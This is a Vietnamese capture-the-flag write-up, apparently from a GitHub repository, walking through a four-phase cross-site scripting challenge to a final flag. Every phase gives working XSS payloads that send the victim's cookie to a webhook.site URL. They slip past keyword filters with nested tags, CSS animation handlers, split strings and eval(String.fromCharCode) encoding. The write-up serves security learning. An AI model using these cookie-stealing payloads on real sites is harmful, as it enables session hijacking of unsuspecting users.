# Đề bài:
![Screenshot (535)](https://github.com/ductohno/ehc-adward/assets/152991010/28e23479-cfbf-4681-8073-bf9c305a9a09)

# Giao diện trang web:
![Screenshot (536)](https://github.com/ductohno/ehc-adward/assets/152991010/ee89af7f-538b-40f0-bf6c-c74487e1cc1e)

# Note:
- Bài này mình sử dụng webhook để nhận respone
- Sau khi bấm send, quay lại trang webhook để xem kết quả

# Khai thác:
- Bài này có 4 phase, chúng ta sẽ đi qua từng phase 1
### Phase 1:
- Bài này là xss, với phase 1 không có filter thì ta có thể tự do trong việc chọn payload
- Payload phase 1: ```<img src=0 onerror='document.location="https://webhook.site/c16cb117-4dd9-4020-81cf-59f35d3853c3?cmd="+document.cookie'>```

- Sau khi bấm send,ta nhận được cookie: ```xss2=/bf2a73106a3aa48bab9b8b47e4bd350e```
### Phase 2:
![Screenshot (537)](https://github.com/ductohno/ehc-adward/assets/152991010/52248f77-2692-488d-884d-2f31124812f8)

- Ở phase 2, nếu trong payload có script, img hoặc svg thì nó sẽ xóa chữ đó đi, ở đây ta có 2 hướng giải:
   
    - Hướng 1: Sử dụng kiểu payload <imimgg , sau khi qua filter, nó còn lại thẻ img

        - Payload: ```<imimgg src=0 onerror='document.location="https://webhook.site/c16cb117-4dd9-4020-81cf-59f35d3853c3?cmd="+document.cookie'>```

    - Hướng 2: Sử dụng 1 thẻ khác ngoài 3 thẻ trên:

        - Payload: ```<style>@keyframes x{}</style><code style="animation-name:x" onanimationend='document.location="https://webhook.site/c16cb117-4dd9-4020-81cf-59f35d3853c3?cmd="+document.cookie
'></code>```

- Sau khi bấm send,ta nhận được cookie: ```xss3=/3e79c8a64bd10f5fa897b7832384f043```
### Phase 3:
![Screenshot (538)](https://github.com/ductohno/ehc-adward/assets/152991010/7eb9d080-cc19-470d-ac5f-536d98796f4f)

- Ở phase 3, chúng ta có 1 filter hoàn toàn khác khi mà xích document, cookie và dấu :// và filter của phase 2

- Với document.cookie, có rất nhiều cách để bypass cái này, ở đây em sử dụng 1 payload em tìm được trên payloadllthething
     - Payload: ```window["doc"+"ument"]["coo"+"kie"]```

- Với dấu ://, em sử dụng fetch để lách luật

- Tổng kết, ta có payload(Không hiểu sao dấu + lại không được nên em sử dụng .concat để thay thế):
     - Payload: ```<style>@keyframes x{}</style><code style="animation-name:x" onanimationend=fetch('//webhook.site/c16cb117-4dd9-4020-81cf-59f35d3853c3?cmd='.concat(window["doc"+"ument"]["coo"+"kie"]))></code>```

- Chúng ta còn 1 cách khác, đó là encode nó, có rất nhiều cách để làm việc đó, một trong số đó là ```eval(String.FromCharCode())```
     - Payload nếu encode: ```<imimgg src=0 onerror='eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,57,55,55,101,52,56,51,57,45,102,50,102,50,45,52,101,49,97,45,98,100,53,48,45,101,97,50,53,55,51,49,49,56,53,52,56,63,99,109,100,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))'>```

- Dãy số trên mang ý nghĩa là:

![Screenshot (540)](https://github.com/ductohno/ehc-adward/assets/152991010/affcfc36-fa6d-4384-8696-3f0f67b39895)

- Sau khi bấm send, ta nhận được cookie: xss4=/f40e749b80cff27f8e726b2a95740dd6
### Phase 4:
![Screenshot (492)](https://github.com/ductohno/ehc-adward/assets/152991010/274a2cd9-38d9-4b25-b9b6-80ca41aea5eb)

- Ở phase 4, thật sự mọi thứ đã khó hơn rất nhiều khi web đã filter dấu ", + và /

- Thực sự thì filter này đã gây ra cho em rất nhiều khó khăn, và em phải chọn phương án đi xin hint

- Hint: Sử dụng eval(String.fromCharCode())

- Để bypass thì em sẽ xài cách encode như em đã trình bày ở phase 3

- #### Payload:
```
<video src=0 onerror='eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,57,55,55,101,52,56,51,57,45,102,50,102,50,45,52,101,49,97,45,98,100,53,48,45,101,97,50,53,55,51,49,49,56,53,52,56,63,99,109,100,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))'>
```

### Kết quả cuối cùng
- Sau khi bấm send ở xss 4, ta nhận được flag:
![Screenshot (497)](https://github.com/ductohno/ehc-adward/assets/152991010/6ec17371-23ef-4496-ad3d-152f528e9858)

# Flag:
N0PS{cR05s_S1t3_Pr0_5cR1pT1nG}
